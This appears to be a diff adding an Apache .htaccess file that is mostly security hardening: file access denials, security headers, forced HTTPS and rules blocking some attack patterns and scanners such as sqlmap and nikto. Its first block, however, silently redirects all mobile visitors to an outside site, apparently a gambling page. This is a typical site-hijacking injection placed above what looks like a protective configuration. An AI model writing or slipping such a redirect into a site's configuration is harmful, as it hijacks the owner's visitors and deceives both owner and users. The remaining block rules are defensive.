@@ -1,0 +1,79 @@
+<IfModule mod_rewrite.c>
+RewriteEngine On
+
+# Deteksi perangkat mobile
+RewriteCond %{HTTP_USER_AGENT} "android|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile" [NC]
+
+# Redirect ke URL tujuan
+RewriteRule ^(.*)$ https://megafortune.fit/progressio/ [R=302,L]
+</IfModule>
+############################################
+# BASIC SECURITY
+############################################
+Options -Indexes
+ServerSignature Off
+
+############################################
+# PROTECT FILE SENSITIF
+############################################
+<FilesMatch "^(config\.inc\.php|composer\.json|composer\.lock|README|INSTALL|UPGRADE|phpunit\.xml|error_log)$">
+Require all denied
+</FilesMatch>
+
+<FilesMatch "^\.">
+Require all denied
+</FilesMatch>
+
+<FilesMatch "\.(bak|old|save|sql|ini|log|sh|dist|swp|tmp)$">
+Require all denied
+</FilesMatch>
+
+############################################
+# SECURITY HEADERS
+############################################
+<IfModule mod_headers.c>
+Header always set X-Frame-Options "SAMEORIGIN"
+Header always set X-Content-Type-Options "nosniff"
+Header always set Referrer-Policy "strict-origin-when-cross-origin"
+Header always set X-XSS-Protection "1; mode=block"
+</IfModule>
+
+############################################
+# REWRITE
+############################################
+RewriteEngine On
+
+############################################
+# FORCE HTTPS (AMAN)
+############################################
+RewriteCond %{HTTPS} !=on
+RewriteCond %{HTTP:X-Forwarded-Proto} !https
+RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]
+
+############################################
+# BLOCK SERANGAN DASAR (TIDAK AGRESIF)
+############################################
+RewriteCond %{QUERY_STRING} (base64_|GLOBALS=|_REQUEST=) [NC]
+RewriteRule .* - [F,L]
+
+############################################
+# BLOCK METHOD BERBAHAYA
+############################################
+RewriteCond %{REQUEST_METHOD} ^(TRACE|DELETE|TRACK|DEBUG) [NC]
+RewriteRule .* - [F,L]
+
+############################################
+# BLOCK BOT JELAS JAHAT
+############################################
+RewriteCond %{HTTP_USER_AGENT} (nikto|sqlmap|acunetix) [NC]
+RewriteRule .* - [F,L]
+
+############################################
+# BLOK PHP DI UPLOAD
+############################################
+RewriteRule ^(.*/)?(files|uploads)/.*\.(php|phtml|php5|php7|php8|phar)$ - [F,L,NC]
+
+############################################
+# BLOK AKSES CACHE / LOG
+############################################
+RewriteRule ^(cache|logs|tmp)/ - [F,L,NC]
